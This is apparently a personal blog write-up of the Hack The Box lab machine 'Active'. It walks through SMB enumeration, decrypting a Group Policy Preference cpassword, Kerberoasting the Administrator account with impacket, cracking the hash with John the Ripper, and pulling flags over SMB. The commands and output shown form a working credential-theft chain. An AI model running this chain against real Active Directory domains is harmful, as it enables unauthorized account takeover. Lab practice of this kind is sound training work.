---
title: "HTB - Active"
date: 2023-03-11T16:40:33+01:00
tag: [HTB, Easy, Windows]
---

Active is an easy HTB box that allows anonymous login on its SMB share. In one of the shares we can access the configuration file of a GPP (Group Policy Preference). We will then use those creds to kerberoast the domain and impersonate the domain admin.

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-02-10T14:23:26
|_  start_date: 2023-02-10T14:17:08
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
```

## ZEROLOGON CVE test

The domain name is `active.htb` and the domain seems to be vulnerable to zerologon CVE
```
cme smb 10.10.10.100 -M zerologon                                                                                                                                                                                                   
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
ZEROLOGO... 10.10.10.100    445    DC               VULNERABLE
ZEROLOGO... 10.10.10.100    445    DC               Next step: https://github.com/dirkjanm/CVE-2020-1472
```

However the vulnerability only allows us to reset the password of a computer account. It seems that this box doesn't have any !

## Enumerating SMB share


```
smbmap -H active.htb                                                                                                                                                                                                               
[+] IP: active.htb:445	Name: unknown                                           
    Disk                                                Permissions	Comment
	----                                                -----------	-------
	Replication                                       	READ ONLY
```

In the `Replication` share we can access a `Groups.xml` file in the `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml` directory

```xml
cat active.htb\\Policies\\\{31B2F340-016D-11D2-945F-00C04FB984F9\}\\MACHINE\\Preferences\\Groups\\Groups.xml | xq
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

## Decrypting Group Policy Preference password

we have a user: `active.htb\SVC_TGS` and an hashed password: `edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`
Since this is a groups policy configuration file, we can use a tool like `gpp-decrypt` to decrypt the password

```
SVC_TGS:edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ:GPPstillStandingStrong2k18                                                                                                                          
```

## Kerberoasting the domain

Looking to the SPNs of the `SVC_TGS` user we can see that it as the Administrator service attached to it and request the hash
```
impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18                                                                                                                                                                  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-02-10 09:18:10.370542

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$3441b65bc2247e4f8a03cf9177a9e76f$97d5ec5ec9153d5ef4ce61654640a3117556642864b84b6e8890a5275cfbc96b9ed53bce558cbb7e3210f3ec81403cc99a1092650963addecf32e42e01ac1cc72d6154cd1cdd47aa62129928a54861778858d0e9bb7a3a967070b6a98b17fd6b852914a9841867fd886e413d03c6b10299a5c2f8c04cf69665d001325e6475d1bf73538e4feee22f5d509036689d79b8427fb30e6b6cbe596d27003909a8937c1aa66fd842ba6d3e2aeb214cdec9f1f307c91947e378cba475df9a4d3d6b029fcb3ee52cf7b3d88a2a7e110df9bd614a361a6907fb17a18bdf80d007c2559fe97d7106c3785508a862f85920870474436db5384954ac3fa52506ec7aa208fc642d8df96fcfefcd41759f8d201af21a66a31424fdd6a3c85c5eb8e58698bebc6f48d3c8156108b26edded0e25028395088bdafbed9e0679f7f3a5c2105f0a30340c7361ea0c17d85cd1a9323a866eed20dacb1cea66e63725b33c5ecf698db6a13764fcd51680e79a7a4ddfa2025e6158408de61656fa89c1f5bb652ba8e88396878cf04a8ec6f8c2d85590c510d4c109a4435b621d56725e3489bd85c72efdcae1361b4f6f29464516310ceb9c43d85504803cdb98d66a7a83436de8fee9c285ff44bdf6a865c436a4b4c01cebba30caa25dad6bfc8341a488710284ff520e59f07e32e2bd81b3ddc310ea64073551850c0c5c79ff2b01811f56abd6830380aa47991e7cedccb8458306ef390b191a74141f25f4156602434c84a6d1e5de882d8a4580e7777592c0af00368be88cd294a1828d14b04078268857efd37d878e1df2e7882e430937c868ee3c235c64ce0c0518b23daaf50524262d7af8374c1d7d13ff275aaeb2d4f5da5a2dff1fcc25d8ed86d968a8476143ac663ac9008521be501bc61de25e92af693da9f4fc31dac84b50f2c08787ca0b0211afdbccb6bc2a02e20b344cf15b8c29ba8d046c018af0ee23535554c2e7cdddac6edd8e702d157a5178b2915fb037ffa5c02c77ac807f1e32df8a718d9f4b5bbcbde619100e9234cc17fedb040159fe3bcf50cf7ebe36892530b6eddd6a1b0a995f5b5952b9713acfd85a2628f23b0ac4286376f55aa16aaabb6a5fe6c84428f30e1bfbada41150cb04d6667311c6ed76ecae77f31ac481fe1d57d6926977ab655c3fac85ba29b4ca1d43c206bcbe471a1b99261ab73a115336b4dada808fabc04be2485281fcc4f19518c55277759de7a2c2b9de6771bd6ae75793d790f711b9
```

Using JTR we can crack the hash of the SPN
```
rick svc_tgs.txt -w /usr/share/wordlists/rockyou.txt                                                                                                                                                                               
...
Ticketmaster1968 (?)     
1g 0:00:00:11 DONE (2023-02-10 11:18) 0.09049g/s 953663p/s 953663c/s 953663C/s Tiffani1432..Thrash1
...
```

We can now the `User` smb share as Administrator and get both the user and the root flag

```
smbclient -U ACTIVE/Administrator \\\\10.10.10.100\\Users
...
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \Administrator\Desktop\> root user.txt
getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```


AAAAAAAAAAAAAAAA